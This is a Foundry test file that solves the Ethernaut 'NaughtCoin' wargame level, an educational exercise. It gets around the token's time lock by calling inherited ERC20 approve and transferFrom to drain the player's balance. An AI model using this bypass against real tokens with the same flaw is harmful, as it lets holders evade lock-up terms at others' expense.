// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/NaughtCoin/NaughtCoinFactory.sol";
import "../src/Ethernaut.sol";

contract NaughtCoinTest is Test {
    Ethernaut ethernaut;
    address player = address(100);
    address player2 = address(200);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
        vm.deal(player2, 1 ether);
    }

    function testNaughtCoinHack() public {
        /****************
         * Factory setup *
         *************** */
        NaughtCoinFactory naughtCoinFactory = new NaughtCoinFactory();
        ethernaut.registerLevel(naughtCoinFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(naughtCoinFactory);
        NaughtCoin ethernautNaughtCoin = NaughtCoin(levelAddress);
        /****************
         *    Attack     *
         *************** */
        /*
         * This challenge is to teach us not to relly on the available function.
         * The contract inherit from ERC20, so eventhough we don't see the function
         * We can call them. And they are not protected by lockTokens modifier !
         */

        uint256 playerBalance = ethernautNaughtCoin.balanceOf(player);
        ethernautNaughtCoin.approve(
            player,
            ethernautNaughtCoin.INITIAL_SUPPLY()
        );
        ethernautNaughtCoin.transferFrom(
            player,
            player2,
            ethernautNaughtCoin.INITIAL_SUPPLY()
        );
        // uint256 player2Balance = ethernautNaughtCoin.balanceOf(player);

        //make sure contract balance is 0.
        assertEq((address(ethernautNaughtCoin).balance), 0);
        assertEq(ethernautNaughtCoin.balanceOf(player), 0);
        assertEq(ethernautNaughtCoin.balanceOf(player2), playerBalance);

        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
